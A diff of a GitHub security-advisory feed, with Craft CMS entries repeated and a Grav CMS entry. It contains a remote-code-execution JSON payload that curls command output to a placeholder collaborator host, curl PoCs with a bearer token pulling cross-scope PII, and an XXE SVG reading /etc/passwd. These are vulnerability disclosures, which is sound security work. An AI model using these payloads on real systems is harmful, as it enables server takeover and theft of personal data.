+<p>We were able to reproduce the attack by issuing a POST request to <code>/admin/actions/element-search/search</code> with the following JSON from any connected user. Other routes can be exploited in the same way, including the rest of the element-indexes actions that pass through that same <code>beforeAction()</code> path. This results in a curl request to the chosen server with the result of the command “id” for the web user being appended to the path:</p>
+<pre><code>POST /admin/actions/element-search/search HTTP/2
+Host: hostnamehere
+Cookie: CraftSessionId=...; 1234123412341234_identity=...; CRAFT_CSRF_TOKEN=...;
+Content-Length: …
+User-Agent: Mozilla/5.0
+X-Csrf-Token: ...
+Accept: application/json
+Content-Type: application/json
+
+{
+
+ "elementType": "craft\\elements\\Category",
+ "siteId": 1,
+ "search": "",
+ "condition": {
+   "class": "craft\\elements\\conditions\\ElementCondition",
+   "elementType": "craft\\elements\\Category",
+   "fieldLayouts": [
+     {
+       "as rce": {
+         "__class": "yii\\behaviors\\AttributeTypecastBehavior",
+         "__construct()": [
+           {
+             "attributeTypes": {
+               "typecastBeforeSave": [
+                 "Psy\\Readline\\Hoa\\ConsoleProcessus",
+                 "execute"
+               ]
+             },
+             "typecastBeforeSave": "/bin/bash -c \"curl [https://yourcollaboratorservergoeshere/`id`\](https://yourcollaboratorservergoeshere/%60id%60/)""
+           }
+         ]
+       },
+       "on *": "self::beforeSave"
+     }
+   ]
+ }
+}
+</code></pre>
+<h2 id="resources">Resources</h2>
+<p><a href="https://github.com/craftcms/cms/commit/ab85ca7f5f926994f723f60584054a1f4c4c5de3">https://github.com/craftcms/cms/commit/ab85ca7f5f926994f723f60584054a1f4c4c5de3</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5">https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5</a></li>
+<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-qrgm-p9w5-rrfw">https://github.com/craftcms/cms/security/advisories/GHSA-qrgm-p9w5-rrfw</a></li>
+<li><a href="https://github.com/advisories/GHSA-qrgm-p9w5-rrfw">https://github.com/advisories/GHSA-qrgm-p9w5-rrfw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-qrgm-p9w5-rrfw</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-06T17:54:06.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[craftcms/cms] Craft CMS has Potential Authenticated Remote Code Execution via Malicious Attached Behavior]]></title>
+        <id>https://github.com/advisories/GHSA-qrgm-p9w5-rrfw</id>
+        <link href="https://github.com/advisories/GHSA-qrgm-p9w5-rrfw"/>
+        <updated>2026-05-06T17:54:06.000Z</updated>
+        <content type="html"><![CDATA[<p>We identified a vulnerability in the latest version of Craft CMS which contains an input-handling flaw in a Yii object creation path that let any authenticated user inject malicious configuration and execute arbitrary commands on the server.  Yii’s dynamic object configuration, as implemented in Craft CMS, is a feature that lets the application build parts of itself from a settings list.</p>
+<p>This is largely a continuation of <a href="https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5">https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5</a>, but through a different path that was not mitigated in the original.</p>
+<p>The request-controlled condition field layouts data is converted into a live FieldLayout object without a <code>Component::cleanseConfig()</code> boundary. Because Craft configures models before <code>parent::__construct()</code>, attacker-controlled special config keys can take effect during object creation, and FieldLayout initialization then triggers a same-request event.</p>
+<p>This appears to be another variant of the recent object-config / behavior-injection bug family, but via the condition / field layout hydration path.</p>
+<p>We were able to reproduce the attack by issuing a POST request to <code>/admin/actions/element-search/search</code> with the following JSON from any connected user. Other routes can be exploited in the same way, including the rest of the element-indexes actions that pass through that same <code>beforeAction()</code> path. This results in a curl request to the chosen server with the result of the command “id” for the web user being appended to the path:</p>
+<pre><code>POST /admin/actions/element-search/search HTTP/2
+Host: hostnamehere
+Cookie: CraftSessionId=...; 1234123412341234_identity=...; CRAFT_CSRF_TOKEN=...;
+Content-Length: …
+User-Agent: Mozilla/5.0
+X-Csrf-Token: ...
+Accept: application/json
+Content-Type: application/json
+
+{
+
+ "elementType": "craft\\elements\\Category",
+ "siteId": 1,
+ "search": "",
+ "condition": {
+   "class": "craft\\elements\\conditions\\ElementCondition",
+   "elementType": "craft\\elements\\Category",
+   "fieldLayouts": [
+     {
+       "as rce": {
+         "__class": "yii\\behaviors\\AttributeTypecastBehavior",
+         "__construct()": [
+           {
+             "attributeTypes": {
+               "typecastBeforeSave": [
+                 "Psy\\Readline\\Hoa\\ConsoleProcessus",
+                 "execute"
+               ]
+             },
+             "typecastBeforeSave": "/bin/bash -c \"curl [https://yourcollaboratorservergoeshere/`id`\](https://yourcollaboratorservergoeshere/%60id%60/)""
+           }
+         ]
+       },
+       "on *": "self::beforeSave"
+     }
+   ]
+ }
+}
+</code></pre>
+<h2 id="resources">Resources</h2>
+<p><a href="https://github.com/craftcms/cms/commit/ab85ca7f5f926994f723f60584054a1f4c4c5de3">https://github.com/craftcms/cms/commit/ab85ca7f5f926994f723f60584054a1f4c4c5de3</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5">https://github.com/craftcms/cms/security/advisories/GHSA-255j-qw47-wjh5</a></li>
+<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-qrgm-p9w5-rrfw">https://github.com/craftcms/cms/security/advisories/GHSA-qrgm-p9w5-rrfw</a></li>
+<li><a href="https://github.com/advisories/GHSA-qrgm-p9w5-rrfw">https://github.com/advisories/GHSA-qrgm-p9w5-rrfw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-qrgm-p9w5-rrfw</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-06T17:54:06.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[craftcms/cms] Craft CMS's Missing Authorization in GraphQL Address Resolver Allows Cross-Scope PII Disclosure]]></title>
+        <id>https://github.com/advisories/GHSA-gj2p-p9m4-c8gw</id>
+        <link href="https://github.com/advisories/GHSA-gj2p-p9m4-c8gw"/>
+        <updated>2026-05-06T17:49:19.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The GraphQL Address element resolver (src/gql/resolvers/elements/Address.php) performs no schema scope filtering on top-level queries. A GraphQL API token scoped to a single low-privilege user group can read every address in the system, including addresses belonging to users in groups the token has no authorization to access. This exposes PII, including full names, addresses, organizations, tax IDs, etc.</p>
+<h3 id="details">Details</h3>
+<p>Every GraphQL element resolver in Craft CMS applies schema scope filtering via <code>GqlHelper::extractAllowedEntitiesFromSchema()</code> when handling top-level queries, except the Address resolver.</p>
+<p>The only gate check for addresses is <code>canQueryUsers()</code> (<code>src/gql/queries/Address.php</code>, line 30), which is a binary check. It returns <code>true</code> if the token has access to <em>any</em> user group. Once past this gate, no further filtering is applied.</p>
+<h3 id="poc">PoC</h3>
+<p><strong>Tested on:</strong> CraftCMS 5.9.17 (fresh Docker install, PHP 8.3)
+<strong>Prerequisites:</strong> A GraphQL API token with read access to any single user group</p>
+<h3 id="environment">Environment</h3>
+<ul>
+<li>Two user groups: <code>publicUsers</code> (in token scope) and <code>internalTeam</code> (NOT in scope)</li>
+<li>5 internal executives with corporate addresses (internalTeam)</li>
+<li>3 public customers with personal addresses (publicUsers)</li>
+<li>GQL token scoped to <code>publicUsers:read</code> only</li>
+</ul>
+<p><strong>Step 1:</strong> Introspect the schema to discover the <code>addresses</code> query is available to this token. Issue the below curl command </p>
+<pre><code class="language-bash">curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ __type(name: \"Query\") { fields { name description } } }"}' http://localhost:8080/actions/graphql/api | jq
+</code></pre>
+<img src="https://github.com/user-attachments/assets/d798b4d2-9965-40fd-8252-ba6b08d1dde9" alt="image" height="856" width="1641">
+
+<p>The token can see <code>addresses</code>, <code>entries</code>, <code>users</code> as top-level queries.</p>
+<p><strong>Step 2:</strong> Enumerate Address fields to identify PII exposure surface.</p>
+<pre><code class="language-bash">curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ __type(name: \"AddressInterface\") { fields { name
+type { name } } } }"}' http://localhost:8080/actions/graphql/api | jq
+</code></pre>
+<img src="https://github.com/user-attachments/assets/31a90b5d-7337-49b9-8802-355f16b7b4f3" alt="image" height="862" width="1726">
+
+<blockquote>
+<p>Exposed fields include: <code>fullName</code>, <code>firstName</code>, <code>lastName</code>, <code>addressLine1/2/3</code>, <code>locality</code>, <code>postalCode</code>, <code>countryCode</code>, <code>organization</code>, <code>organizationTaxId</code>, <code>latitude</code>, <code>longitude</code>.</p>
+</blockquote>
+<p><strong>Step 3:</strong> Establish baseline -  confirm the token’s user scope is limited. This proves our token only has access to the <code>publicUsers</code> group.</p>
+<pre><code class="language-bash">curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ addresses { id fullName firstName lastName addressLine1 addressLine2 locality postalCode countryCode organization
+organizationTaxId } }"}' http://localhost:8080/actions/graphql/api | jq
+</code></pre>
+<img src="https://github.com/user-attachments/assets/42ec8c3d-d1ae-4eac-9202-af072f394e4a" alt="image" height="492" width="1626">
+
+<p>Only 5 public users returned. Scope enforcement works correctly for the User resolver — internal executives are NOT visible.</p>
+<p><strong>Step 4:</strong> Query all addresses - the token returns data for ALL user groups, including those outside its authorized scope.</p>
+<pre><code class="language-bash">curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ addresses { id fullName firstName lastName addressLine1 addressLine2 locality postalCode countryCode organization
+  organizationTaxId } }"}' http://localhost:8080/actions/graphql/api | jq
+</code></pre>
+<img src="https://github.com/user-attachments/assets/ef34e11c-36a8-4582-93e3-04c3e4dad6ab" alt="image" height="910" width="1902">
+
+<img src="https://github.com/user-attachments/assets/64d6edec-60bf-4481-8a20-7f64c81c015b" alt="image" height="942" width="1444">
+
+
+<p> ▎ "This token can only see 5 users, but it returns 10 addresses" as shown in the above 2 screenshot outputs</p>
+<blockquote>
+<p><strong>All 10 addresses returned.</strong> The same token that only sees 5 public users now returns addresses for internal executives including corporate tax IDs:</p>
+<ul>
+<li>Sarah Chen, 4200 Executive Plaza Dr, SF — Horizon Dynamics Inc. (TaxID: 82-4917263)</li>
+<li>James Whitfield, 89 Kensington High St, London — Whitfield Capital Partners LLP (TaxID: GB927461038)</li>
+<li>Maria Rossi, 15 Via della Conciliazione, Roma — Rossi &amp; Bianchi Avvocati (TaxID: IT04829173651)</li>
+<li>David Nakamura, 2-11-3 Meguro, Tokyo — Nakamura Medical Technologies KK (TaxID: JP8230-4719-2835)</li>
+<li>Elena Voronova, 27 Universitätsstrasse, Zurich — Voronova Biotech AG (TaxID: CHE-384.291.057)</li>
+</ul>
+</blockquote>
+<hr>
+<p><strong>Step 5:</strong> Targeted IDOR - extract a specific internal user’s address by owner ID.</p>
+<pre><code class="language-bash">curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ addresses(ownerId: [3]) { fullName addressLine1 addressLine2 locality postalCode countryCode organization
+  organizationTaxId } }"}' http://localhost:8080/actions/graphql/api | jq
+</code></pre>
+<img src="https://github.com/user-attachments/assets/b7c6d5cf-295a-433a-a76c-2b69815968cd" alt="image" height="365" width="1902">
+
+<blockquote>
+<p>Directly extracts a specific internal team member’s address: “Secret Admin”, 1 Secret Government Facility, Suite 007, Langley 22101 — SecretCorp LLC (TaxID: 98-7654321). The token has zero authorization to access this user’s data.</p>
+</blockquote>
+<h2 id="impact">Impact</h2>
+<h3 id="who-is-impacted">Who is Impacted</h3>
+<p>Any Craft CMS Pro site (v4.0.0+) that uses GraphQL API tokens with user group scoping and stores user addresses. This is the standard deployment pattern for headless CMS sites using frameworks such as Next.js, Nuxt.js, or Gatsby. An attacker with any valid GraphQL token that has access to at least one user group can extract all addresses in the system, regardless of scope restrictions.</p>
+<h3 id="risk">Risk</h3>
+<ul>
+<li><p>Direct threat to installation data: Any GraphQL API token with access to any single user group can extract all address systems-wide, including names, home addresses, organizations, and tax IDs belonging to users in restricted groups.</p>
+</li>
+<li><p>Targeted extraction via IDOR: The <code>ownerId</code> argument allows an attacker to extract specific users’ addresses by ID, enabling targeted reconnaissance against administrators or high-value users without any brute-force or elevated access.</p>
+</li>
+<li><p>Scope boundary failure: Craft CMS’s GraphQL schema scoping system is the primary security mechanism for controlling API access. Every other element resolver (Entry, User, Asset, Category, Tag) enforces this boundary. The Address resolver does not, making this a foundational gap in Craft’s native authorization model and not a site-specific configuration issue.</p>
+</li>
+<li><p>Affects all installations using GraphQL with user groups: Any Craft CMS Pro site that exposes a scoped GraphQL token and stores addresses is affected. This is the standard headless CMS deployment pattern, not an edge case.</p>
+</li>
+</ul>
+<h2 id="ai-disclosure">AI Disclosure</h2>
+<p>This vulnerability was identified through manual source code review with AI-assisted analysis (Claude). The initial pattern deviation (Address resolver missing scope filtering while all other resolvers have it) was identified through manual comparison of resolver implementations. AI was used to assist with code navigation, PoC scripting, and report drafting. </p>
+<p>All findings were verified against a local Docker instance of Craft CMS 5.9.17.</p>
+<h2 id="resources">Resources</h2>
+<p><a href="https://github.com/craftcms/cms/commit/834b2cf61ad0dcee9b03add44ed402ebf18db128">https://github.com/craftcms/cms/commit/834b2cf61ad0dcee9b03add44ed402ebf18db128</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-gj2p-p9m4-c8gw">https://github.com/craftcms/cms/security/advisories/GHSA-gj2p-p9m4-c8gw</a></li>
+<li><a href="https://github.com/craftcms/cms/commit/834b2cf61ad0dcee9b03add44ed402ebf18db128">https://github.com/craftcms/cms/commit/834b2cf61ad0dcee9b03add44ed402ebf18db128</a></li>
+<li><a href="https://github.com/advisories/GHSA-gj2p-p9m4-c8gw">https://github.com/advisories/GHSA-gj2p-p9m4-c8gw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-gj2p-p9m4-c8gw</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-06T17:49:17.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[craftcms/cms] Craft CMS's Missing Authorization in GraphQL Address Resolver Allows Cross-Scope PII Disclosure]]></title>
+        <id>https://github.com/advisories/GHSA-gj2p-p9m4-c8gw</id>
+        <link href="https://github.com/advisories/GHSA-gj2p-p9m4-c8gw"/>
+        <updated>2026-05-06T17:49:19.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>The GraphQL Address element resolver (src/gql/resolvers/elements/Address.php) performs no schema scope filtering on top-level queries. A GraphQL API token scoped to a single low-privilege user group can read every address in the system, including addresses belonging to users in groups the token has no authorization to access. This exposes PII, including full names, addresses, organizations, tax IDs, etc.</p>
+<h3 id="details">Details</h3>
+<p>Every GraphQL element resolver in Craft CMS applies schema scope filtering via <code>GqlHelper::extractAllowedEntitiesFromSchema()</code> when handling top-level queries, except the Address resolver.</p>
+<p>The only gate check for addresses is <code>canQueryUsers()</code> (<code>src/gql/queries/Address.php</code>, line 30), which is a binary check. It returns <code>true</code> if the token has access to <em>any</em> user group. Once past this gate, no further filtering is applied.</p>
+<h3 id="poc">PoC</h3>
+<p><strong>Tested on:</strong> CraftCMS 5.9.17 (fresh Docker install, PHP 8.3)
+<strong>Prerequisites:</strong> A GraphQL API token with read access to any single user group</p>
+<h3 id="environment">Environment</h3>
+<ul>
+<li>Two user groups: <code>publicUsers</code> (in token scope) and <code>internalTeam</code> (NOT in scope)</li>
+<li>5 internal executives with corporate addresses (internalTeam)</li>
+<li>3 public customers with personal addresses (publicUsers)</li>
+<li>GQL token scoped to <code>publicUsers:read</code> only</li>
+</ul>
+<p><strong>Step 1:</strong> Introspect the schema to discover the <code>addresses</code> query is available to this token. Issue the below curl command </p>
+<pre><code class="language-bash">curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ __type(name: \"Query\") { fields { name description } } }"}' http://localhost:8080/actions/graphql/api | jq
+</code></pre>
+<img src="https://github.com/user-attachments/assets/d798b4d2-9965-40fd-8252-ba6b08d1dde9" alt="image" height="856" width="1641">
+
+<p>The token can see <code>addresses</code>, <code>entries</code>, <code>users</code> as top-level queries.</p>
+<p><strong>Step 2:</strong> Enumerate Address fields to identify PII exposure surface.</p>
+<pre><code class="language-bash">curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ __type(name: \"AddressInterface\") { fields { name
+type { name } } } }"}' http://localhost:8080/actions/graphql/api | jq
+</code></pre>
+<img src="https://github.com/user-attachments/assets/31a90b5d-7337-49b9-8802-355f16b7b4f3" alt="image" height="862" width="1726">
+
+<blockquote>
+<p>Exposed fields include: <code>fullName</code>, <code>firstName</code>, <code>lastName</code>, <code>addressLine1/2/3</code>, <code>locality</code>, <code>postalCode</code>, <code>countryCode</code>, <code>organization</code>, <code>organizationTaxId</code>, <code>latitude</code>, <code>longitude</code>.</p>
+</blockquote>
+<p><strong>Step 3:</strong> Establish baseline -  confirm the token’s user scope is limited. This proves our token only has access to the <code>publicUsers</code> group.</p>
+<pre><code class="language-bash">curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ addresses { id fullName firstName lastName addressLine1 addressLine2 locality postalCode countryCode organization
+organizationTaxId } }"}' http://localhost:8080/actions/graphql/api | jq
+</code></pre>
+<img src="https://github.com/user-attachments/assets/42ec8c3d-d1ae-4eac-9202-af072f394e4a" alt="image" height="492" width="1626">
+
+<p>Only 5 public users returned. Scope enforcement works correctly for the User resolver — internal executives are NOT visible.</p>
+<p><strong>Step 4:</strong> Query all addresses - the token returns data for ALL user groups, including those outside its authorized scope.</p>
+<pre><code class="language-bash">curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ addresses { id fullName firstName lastName addressLine1 addressLine2 locality postalCode countryCode organization
+  organizationTaxId } }"}' http://localhost:8080/actions/graphql/api | jq
+</code></pre>
+<img src="https://github.com/user-attachments/assets/ef34e11c-36a8-4582-93e3-04c3e4dad6ab" alt="image" height="910" width="1902">
+
+<img src="https://github.com/user-attachments/assets/64d6edec-60bf-4481-8a20-7f64c81c015b" alt="image" height="942" width="1444">
+
+
+<p> ▎ "This token can only see 5 users, but it returns 10 addresses" as shown in the above 2 screenshot outputs</p>
+<blockquote>
+<p><strong>All 10 addresses returned.</strong> The same token that only sees 5 public users now returns addresses for internal executives including corporate tax IDs:</p>
+<ul>
+<li>Sarah Chen, 4200 Executive Plaza Dr, SF — Horizon Dynamics Inc. (TaxID: 82-4917263)</li>
+<li>James Whitfield, 89 Kensington High St, London — Whitfield Capital Partners LLP (TaxID: GB927461038)</li>
+<li>Maria Rossi, 15 Via della Conciliazione, Roma — Rossi &amp; Bianchi Avvocati (TaxID: IT04829173651)</li>
+<li>David Nakamura, 2-11-3 Meguro, Tokyo — Nakamura Medical Technologies KK (TaxID: JP8230-4719-2835)</li>
+<li>Elena Voronova, 27 Universitätsstrasse, Zurich — Voronova Biotech AG (TaxID: CHE-384.291.057)</li>
+</ul>
+</blockquote>
+<hr>
+<p><strong>Step 5:</strong> Targeted IDOR - extract a specific internal user’s address by owner ID.</p>
+<pre><code class="language-bash">curl -s -H "Authorization: Bearer wbzwuzvlfohtahryztgaawyjpctqdvcm" -H "Content-Type: application/json" -d '{"query": "{ addresses(ownerId: [3]) { fullName addressLine1 addressLine2 locality postalCode countryCode organization
+  organizationTaxId } }"}' http://localhost:8080/actions/graphql/api | jq
+</code></pre>
+<img src="https://github.com/user-attachments/assets/b7c6d5cf-295a-433a-a76c-2b69815968cd" alt="image" height="365" width="1902">
+
+<blockquote>
+<p>Directly extracts a specific internal team member’s address: “Secret Admin”, 1 Secret Government Facility, Suite 007, Langley 22101 — SecretCorp LLC (TaxID: 98-7654321). The token has zero authorization to access this user’s data.</p>
+</blockquote>
+<h2 id="impact">Impact</h2>
+<h3 id="who-is-impacted">Who is Impacted</h3>
+<p>Any Craft CMS Pro site (v4.0.0+) that uses GraphQL API tokens with user group scoping and stores user addresses. This is the standard deployment pattern for headless CMS sites using frameworks such as Next.js, Nuxt.js, or Gatsby. An attacker with any valid GraphQL token that has access to at least one user group can extract all addresses in the system, regardless of scope restrictions.</p>
+<h3 id="risk">Risk</h3>
+<ul>
+<li><p>Direct threat to installation data: Any GraphQL API token with access to any single user group can extract all address systems-wide, including names, home addresses, organizations, and tax IDs belonging to users in restricted groups.</p>
+</li>
+<li><p>Targeted extraction via IDOR: The <code>ownerId</code> argument allows an attacker to extract specific users’ addresses by ID, enabling targeted reconnaissance against administrators or high-value users without any brute-force or elevated access.</p>
+</li>
+<li><p>Scope boundary failure: Craft CMS’s GraphQL schema scoping system is the primary security mechanism for controlling API access. Every other element resolver (Entry, User, Asset, Category, Tag) enforces this boundary. The Address resolver does not, making this a foundational gap in Craft’s native authorization model and not a site-specific configuration issue.</p>
+</li>
+<li><p>Affects all installations using GraphQL with user groups: Any Craft CMS Pro site that exposes a scoped GraphQL token and stores addresses is affected. This is the standard headless CMS deployment pattern, not an edge case.</p>
+</li>
+</ul>
+<h2 id="ai-disclosure">AI Disclosure</h2>
+<p>This vulnerability was identified through manual source code review with AI-assisted analysis (Claude). The initial pattern deviation (Address resolver missing scope filtering while all other resolvers have it) was identified through manual comparison of resolver implementations. AI was used to assist with code navigation, PoC scripting, and report drafting. </p>
+<p>All findings were verified against a local Docker instance of Craft CMS 5.9.17.</p>
+<h2 id="resources">Resources</h2>
+<p><a href="https://github.com/craftcms/cms/commit/834b2cf61ad0dcee9b03add44ed402ebf18db128">https://github.com/craftcms/cms/commit/834b2cf61ad0dcee9b03add44ed402ebf18db128</a></p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/craftcms/cms/security/advisories/GHSA-gj2p-p9m4-c8gw">https://github.com/craftcms/cms/security/advisories/GHSA-gj2p-p9m4-c8gw</a></li>
+<li><a href="https://github.com/craftcms/cms/commit/834b2cf61ad0dcee9b03add44ed402ebf18db128">https://github.com/craftcms/cms/commit/834b2cf61ad0dcee9b03add44ed402ebf18db128</a></li>
+<li><a href="https://github.com/advisories/GHSA-gj2p-p9m4-c8gw">https://github.com/advisories/GHSA-gj2p-p9m4-c8gw</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-gj2p-p9m4-c8gw</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-05-06T17:49:17.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[wwbn/avideo] AVideo Vulnerable to Exposure of Sensitive Information to an Unauthorized Actor and Missing Authorization]]></title>
         <id>https://github.com/advisories/GHSA-xr49-f4rh-qcjf</id>
@@ -1110,1239 +1807,5 @@ Priority: u=6
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-05-05T21:36:27.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[getgrav/grav] Grav is Vulnerable to XXE via SVG Upload ]]></title>
-        <id>https://github.com/advisories/GHSA-3446-6mgw-f79p</id>
-        <link href="https://github.com/advisories/GHSA-3446-6mgw-f79p"/>
-        <updated>2026-05-05T21:35:54.000Z</updated>
-        <content type="html"><![CDATA[<p>Dear Grav Security Team,</p>
-<p>A security vulnerability was discovered in Grav CMS that allows authenticated attackers to read arbitrary files from the server through XML External Entity (XXE) injection.</p>
-<p> Vulnerability Summary</p>
-<table>
-<thead>
-<tr>
-<th>Field</th>
-<th>Details</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>Vulnerability Type</td>
-<td>XML External Entity (XXE) Injection</td>
-</tr>
-<tr>
-<td>Severity</td>
-<td>High (CVSS 7.5)</td>
-</tr>
-<tr>
-<td>Affected Versions</td>
-<td>Grav CMS &lt;= 1.7.x</td>
-</tr>
-<tr>
-<td>Affected Component</td>
-<td>SVG file upload/processing</td>
-</tr>
-<tr>
-<td>CWE</td>
-<td>CWE-611: Improper Restriction of XML External Entity Reference</td>
-</tr>
-<tr>
-<td>Authentication Required</td>
-<td>Yes (Admin panel access)</td>
-</tr>
-</tbody></table>
-<p>Technical Details</p>
-<p> Root Cause
-The application uses <code>simplexml_load_string()</code> to process uploaded SVG files without disabling external entity loading. This allows attackers to inject XXE payloads that are processed by the XML parser.</p>
-<p> Vulnerable Code Pattern</p>
-<pre><code class="language-php">// Current (Vulnerable):
-$svg = simplexml_load_string($content);
-
-// No LIBXML_NOENT flag or entity loader protection
-</code></pre>
-<p> Attack Vector</p>
-<ol>
-<li>Attacker authenticates to Grav admin panel</li>
-<li>Uploads malicious SVG file via Pages → Media or File Manager plugin</li>
-<li>Server parses SVG and processes XXE entities</li>
-<li>Arbitrary file contents are exfiltrated</li>
-</ol>
-<p> Impact</p>
-<p>An authenticated attacker can:</p>
-<ol>
-<li><p>Read sensitive files:</p>
-<ul>
-<li><code>/etc/passwd</code> - System user information</li>
-<li><code>user/accounts/*.yaml</code> - Admin credentials and 2FA secrets</li>
-<li><code>user/config/system.yaml</code> - System configuration</li>
-<li><code>.env</code> files - Environment secrets and API keys</li>
-</ul>
-</li>
-<li><p>Perform SSRF - Access internal services via external entity URLs</p>
-</li>
-<li><p>Potential DoS - Billion laughs attack via recursive entity expansion</p>
-</li>
-</ol>
-<p>Proof of Concept</p>
-<p> Malicious SVG Payload</p>
-<pre><code class="language-xml">&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;!DOCTYPE svg [
-  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
-]&gt;
-&lt;svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"&gt;
-  &lt;text x="10" y="50"&gt;&amp;xxe;&lt;/text&gt;
-&lt;/svg&gt;
-</code></pre>
-<p> Steps to Reproduce</p>
-<ol>
-<li>Login to Grav CMS admin panel</li>
-<li>Navigate to Pages → select any page → Media tab</li>
-<li>Upload the malicious SVG file</li>
-<li>Observe file contents in response/error or stored output</li>
-</ol>
-<p> Recommended Fix</p>
-<p> Option 1: Add XXE Protection Flags</p>
-<pre><code class="language-php">libxml_use_internal_errors(true);
-$svg = simplexml_load_string($content, 'SimpleXMLElement', LIBXML_NOENT | LIBXML_DTDLOAD);
-</code></pre>
-<p> Option 2: Use SVG Sanitizer Library (Recommended)</p>
-<pre><code class="language-php">use enshrined\svgSanitize\Sanitizer;
-
-$sanitizer = new Sanitizer();
-$sanitizer-&gt;removeRemoteReferences(true);
-$cleanSVG = $sanitizer-&gt;sanitize($content);
-</code></pre>
-<p>The <code>enshrined/svg-sanitize</code> library properly strips XXE payloads and other malicious SVG content.</p>
-<p> Request</p>
-<ol>
-<li>Please acknowledge receipt of this report within 5 business days</li>
-<li>Please provide an estimated timeline for a security patch</li>
-<li>I am happy to assist with testing the fix</li>
-<li>I request a CVE be assigned for this vulnerability</li>
-<li>If you have a security advisory process, please include me in the credits</li>
-</ol>
-<p>Turki Almatrafi.</p>
-<hr>
-<h2 id="maintainer-note--fix-applied-2026-04-24">Maintainer note — fix applied (2026-04-24)</h2>
-<p>Fixed across two repos:</p>
-<ol>
-<li><p><strong>Grav core on the <code>2.0</code> branch</strong> (commit <a href="https://github.com/getgrav/grav/commit/5a12f9be8"><code>5a12f9be8</code></a>, ships in <strong>2.0.0-beta.2</strong>) — <code>VectorImageMedium::__construct</code> (the code path that reads width/height from an uploaded SVG) now strips <code>&lt;!DOCTYPE&gt;</code> and <code>&lt;!ENTITY&gt;</code> declarations before parsing, and calls <code>simplexml_load_string</code> with <code>LIBXML_NONET | LIBXML_NOERROR | LIBXML_NOWARNING</code>. On PHP &lt; 8 it also calls <code>libxml_disable_entity_loader(true)</code> for the duration of the parse.</p>
-</li>
-<li><p><strong>rhukster/dom-sanitizer</strong> (commit <a href="https://github.com/rhukster/dom-sanitizer/commit/02d08ec"><code>02d08ec</code></a>) — the library Grav ships as its SVG sanitizer. <code>loadDocument</code> now applies the same DOCTYPE/ENTITY strip and passes <code>LIBXML_NONET</code> to <code>loadXML</code>/<code>loadHTML</code>.</p>
-</li>
-</ol>
-<p>With both layers in place, the PoC:</p>
-<pre><code class="language-xml">&lt;!DOCTYPE svg [
-  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
-]&gt;
-&lt;svg xmlns="http://www.w3.org/2000/svg" width="100" height="100"&gt;
-  &lt;text x="10" y="50"&gt;&amp;xxe;&lt;/text&gt;
-&lt;/svg&gt;
-</code></pre>
-<p>no longer expands <code>&amp;xxe;</code>, and the parser cannot make outbound filesystem or network requests for external entities/DTDs. Billion-laughs-style entity expansion is also neutralized because the declarations are stripped before libxml ever sees them.</p>
-<p><strong>Files:</strong></p>
-<ul>
-<li><a href="https://github.com/getgrav/grav/blob/2.0/system/src/Grav/Common/Page/Medium/VectorImageMedium.php"><code>system/src/Grav/Common/Page/Medium/VectorImageMedium.php</code></a>.</li>
